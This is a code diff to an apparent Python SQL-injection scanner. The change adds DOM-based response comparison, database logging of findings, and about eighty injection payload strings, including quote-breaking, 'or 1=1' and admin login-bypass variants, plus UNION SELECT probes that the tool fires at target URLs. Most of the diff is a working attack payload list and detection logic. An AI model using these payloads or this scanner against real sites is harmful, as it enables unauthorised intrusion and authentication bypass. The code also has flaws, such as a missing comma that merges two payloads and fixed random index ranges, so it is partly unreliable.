@@ -1,5 +1,5 @@
 # coding:utf8
-
+import mysql
 import requests
 import urllib.parse
 from urllib.parse import quote as urlencode
@@ -12,6 +12,8 @@ import threading
 import dbms as dbms
 from config import *
 import imp
+import DOM
+import random
 
 imp.reload(sys)
 # sys.setdefaultencoding( "utf-8" )
@@ -49,21 +51,102 @@ class vul_module(threading.Thread):
             res_md5_1 = md5_encrypt(requests.get(url=self.url, headers=HEADER).text)
             res_md5_2 = md5_encrypt(requests.get(url=self.url + urlencode('+1'), headers=HEADER).text)
             res_md5_3 = md5_encrypt(requests.get(url=self.url + urlencode('+1-1'), headers=HEADER).text)
+            res_DOM_1 = DOM.check(self.url)
+            res_DOM_2 = DOM.check(self.url + urlencode('+1'))
+            res_DOM_3 = DOM.check(self.url + urlencode('+1-1'))
         except Exception as e:
             print(e)
             res_md5_1 = res_md5_2 = res_md5_3 = 0
             pass
 
-        if (res_md5_1 == res_md5_3) and res_md5_1 != res_md5_2:
+        if (res_DOM_1 == res_DOM_3 and res_DOM_1 != res_DOM_2) or ((res_md5_1 == res_md5_3) and res_md5_1 != res_md5_2):
             return self.url
         return 0
 
     def Str_sqlinj_scan(self, waf):
         quotes = ['\'', '"', '']
+
         payload_0 = [" and 0;-- ",
                      "/**/and/**/0;#",
                      "\tand\t0;#",
                      "\nand/**/0;#",
+                     "\'-\'",
+                     "\' \'",
+                     "\'&\'",
+                     "\'^\'",
+                     "\'*\'",
+                     "\' or \'\'-\'",
+                     "\' or \'\' \'",
+                     "\' or \'\'&\'",
+                     "\' or \'\'^\'",
+                     "\' or \'\'*\'",
+                     "\"-\"",
+                     "\" \"",
+                     "\"&\"",
+                     "\"^\"",
+                     "\"*\"",
+                     "\" or \"\"-\"",
+                     "\" or \"\" \"",
+                     "\" or \"\"&\"",
+                     "\" or \"\"^\"",
+                     "\" or \"\"*\"",
+                     "or true--",
+                     "\" or true--",
+                     "\' or true--",
+                     "\") or true--",
+                     "\') or true--",
+                     "\' or \'x\'=\'x",
+                     "\') or (\'x\')=(\'x",
+                     "\')) or ((\'x\'))=((\'x",
+                     "\" or \"x\"=\"x",
+                     "\") or (\"x\")=(\"x",
+                     "\")) or ((\"x\"))=((\"x",
+                     "or 1=1",
+                     "or 1=1--",
+                     "or 1=1#",
+                     "or 1=1/*",
+                     "admin\' --",
+                     "admin\' #",
+                     "admin\'/*",
+                     "admin\' or \'1\'=\'1",
+                     "admin\' or \'1\'=\'1\'--",
+                     "admin\' or \'1\'=\'1\'#",
+                     "admin\' or \'1\'=\'1\'/*",
+                     "admin\'or 1=1 or \'\'=\'",
+                     "admin\' or 1=1",
+                     "admin\' or 1=1--",
+                     "admin\' or 1=1#",
+                     "admin\' or 1=1/*",
+                     "admin\') or (\'1\'=\'1",
+                     "admin\') or (\'1\'=\'1\'--",
+                     "admin\') or (\'1\'=\'1\'#",
+                     "admin\') or (\'1\'=\'1\'/*",
+                     "admin\') or \'1\'=\'1",
+                     "admin\') or \'1\'=\'1\'--",
+                     "admin\') or \'1\'=\'1\'#",
+                     "admin\') or \'1\'=\'1\'/*",
+                     "1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055",
+                     "admin\" --",
+                     "admin\" #",
+                     "admin\"/*",
+                     "admin\" or \"1\"=\"1",
+                     "admin\" or \"1\"=\"1\"--",
+                     "admin\" or \"1\"=\"1\"#",
+                     "admin\" or \"1\"=\"1\"/*",
+                     "admin\"or 1=1 or \"\"=\"",
+                     "admin\" or 1=1",
+                     "admin\" or 1=1--",
+                     "admin\" or 1=1#",
+                     "admin\" or 1=1/*",
+                     "admin\") or (\"1\"=\"1",
+                     "admin\") or (\"1\"=\"1\"--",
+                     "admin\") or (\"1\"=\"1\"#",
+                     "admin\") or (\"1\"=\"1\"/*",
+                     "admin\") or \"1\"=\"1",
+                     "admin\") or \"1\"=\"1\"--",
+                     "admin\") or \"1\"=\"1\"#",
+                     "admin\") or \"1\"=\"1\"/*",
+                     "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed05\"",
                      " UNION ALL SELECT 1,2,3,4",
                      " UNION ALL SELECT 1,2,3,4,5-- ",
                      " UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
@@ -76,6 +159,83 @@ class vul_module(threading.Thread):
                      "/**/and/**/1;#",
                      "\tand\t1;#",
                      "\nand/**/1;#",
+                     "\'-\'",
+                     "\' \'",
+                     "\'&\'",
+                     "\'^\'",
+                     "\'*\'",
+                     "\' or \'\'-\'",
+                     "\' or \'\' \'",
+                     "\' or \'\'&\'",
+                     "\' or \'\'^\'",
+                     "\' or \'\'*\'",
+                     "\"-\"",
+                     "\" \"",
+                     "\"&\"",
+                     "\"^\"",
+                     "\"*\"",
+                     "\" or \"\"-\"",
+                     "\" or \"\" \"",
+                     "\" or \"\"&\"",
+                     "\" or \"\"^\"",
+                     "\" or \"\"*\"",
+                     "or true--",
+                     "\" or true--",
+                     "\' or true--",
+                     "\") or true--",
+                     "\') or true--",
+                     "\' or \'x\'=\'x",
+                     "\') or (\'x\')=(\'x",
+                     "\')) or ((\'x\'))=((\'x",
+                     "\" or \"x\"=\"x",
+                     "\") or (\"x\")=(\"x",
+                     "\")) or ((\"x\"))=((\"x",
+                     "or 1=1",
+                     "or 1=1--",
+                     "or 1=1#",
+                     "or 1=1/*",
+                     "admin\' --",
+                     "admin\' #",
+                     "admin\'/*",
+                     "admin\' or \'1\'=\'1",
+                     "admin\' or \'1\'=\'1\'--",
+                     "admin\' or \'1\'=\'1\'#",
+                     "admin\' or \'1\'=\'1\'/*",
+                     "admin\'or 1=1 or \'\'=\'",
+                     "admin\' or 1=1",
+                     "admin\' or 1=1--",
+                     "admin\' or 1=1#",
+                     "admin\' or 1=1/*",
+                     "admin\') or (\'1\'=\'1",
+                     "admin\') or (\'1\'=\'1\'--",
+                     "admin\') or (\'1\'=\'1\'#",
+                     "admin\') or (\'1\'=\'1\'/*",
+                     "admin\') or \'1\'=\'1",
+                     "admin\') or \'1\'=\'1\'--",
+                     "admin\') or \'1\'=\'1\'#",
+                     "admin\') or \'1\'=\'1\'/*",
+                     "1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055",
+                     "admin\" --",
+                     "admin\" #",
+                     "admin\"/*",
+                     "admin\" or \"1\"=\"1",
+                     "admin\" or \"1\"=\"1\"--",
+                     "admin\" or \"1\"=\"1\"#",
+                     "admin\" or \"1\"=\"1\"/*",
+                     "admin\"or 1=1 or \"\"=\"",
+                     "admin\" or 1=1",
+                     "admin\" or 1=1--",
+                     "admin\" or 1=1#",
+                     "admin\" or 1=1/*",
+                     "admin\") or (\"1\"=\"1",
+                     "admin\") or (\"1\"=\"1\"--",
+                     "admin\") or (\"1\"=\"1\"#",
+                     "admin\") or (\"1\"=\"1\"/*",
+                     "admin\") or \"1\"=\"1",
+                     "admin\") or \"1\"=\"1\"--",
+                     "admin\") or \"1\"=\"1\"#",
+                     "admin\") or \"1\"=\"1\"/*",
+                     "1234 \" AND 1=0 UNION ALL SELECT \""
                      " UNION ALL SELECT 1,2,3,4",
                      " UNION ALL SELECT 1,2,3,4,5-- ",
                      " UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
@@ -130,22 +290,25 @@ class vul_module(threading.Thread):
                      ]
 
         for i in quotes:
-            for j in range(len(payload_0)):
+            for j in range(10):
                 if waf.cget("text") == 'WAF:None':
-                    p0 = i + payload_0[j]
-                    p1 = i + payload_1[j]
+                    p0 = i + payload_0[random.randint(0,85)]
+                    p1 = i + payload_1[random.randint(0,85)]
                 else:
-                    p0 = i + payload_3[j]
-                    p1 = i + payload_4[j]
+                    p0 = i + payload_3[random.randint(0,85)]
+                    p1 = i + payload_4[random.randint(0,85)]
                 try:
                     res_md5_1 = md5_encrypt(requests.get(url=self.url, headers=HEADER).text)
                     res_md5_2 = md5_encrypt(requests.get(url=self.url + urlencode(p0), headers=HEADER).text)
                     res_md5_3 = md5_encrypt(requests.get(url=self.url + urlencode(p1), headers=HEADER).text)
+                    res_DOM_1 = DOM.check(self.url)
+                    res_DOM_2 = DOM.check(self.url + urlencode(p0))
+                    res_DOM_3 = DOM.check(self.url + urlencode(p1))
                 except Exception as e:
                     print(e)
                     res_md5_1 = res_md5_2 = res_md5_3 = 0
                     pass
-                if (res_md5_1 == res_md5_3) and res_md5_1 != res_md5_2:
+                if (res_DOM_1 == res_DOM_3 and res_DOM_1 != res_DOM_2) or ((res_md5_1 == res_md5_3) and res_md5_1 != res_md5_2):
                     return p0 + "," + self.url
         return 0
 
@@ -327,16 +490,20 @@ class vul_module(threading.Thread):
                 j = self.Str_sqlinj_scan(waf)
                 k = self.Sql_error_scan()
                 if i:
-                    output.insert("", "end", values=(i, " +1", "yes", "High"))
+                    output.insert("", "end", values=(i, " +1", "yes", "High",self.url[self.url.find("?")+1:self.url.find("=")]))
+                    mysql.insert(i+"","+1","yes","High",self.url[self.url.find("?")+1:self.url.find("=")])
                     print(get_ctime() + '\t' + self.url + ":SQL injection!")
                 elif j:
-                    output.insert("", "end", values=(j.split(",")[1], j.split(",")[0], "yes", "High"))
+                    output.insert("", "end", values=(j.split(",")[1], j.split(",")[0], "yes", "High",self.url[self.url.find("?")+1:self.url.find("=")]))
+                    mysql.insert(j.split(",")[1] , j.split(",")[0], "yes", "High", self.url[self.url.find("?") + 1:self.url.find("=")])
                     print(get_ctime() + '\t' + self.url + ":SQL injection!")
                 elif k:
-                    output.insert("", "end", values=(k, "\'", "yes", "High"))
+                    output.insert("", "end", values=(k, "\'", "yes", "High",self.url[self.url.find("?")+1:self.url.find("=")]))
+                    mysql.insert(k+"","\'", "yes", "High",self.url[self.url.find("?") + 1:self.url.find("=")])
                     print(get_ctime() + '\t' + self.url + ":SQL injection!")
                 else:
-                    output.insert("", "end", values=(self.url, "", "no", ""))
+                    output.insert("", "end", values=(self.url, "", "no", "",self.url[self.url.find("?")+1:self.url.find("=")]))
+                    mysql.insert(self.url, "\'", "no", "", self.url[self.url.find("?") + 1:self.url.find("=")])
 
             # 	print get_ctime() + '\t' + self.url + ":SQL injection!"+ self.Str_sqlinj_scan()
             # 	self.logfile.write(get_ctime() + '\t' + self.url + ":SQL injection!" + '\n')
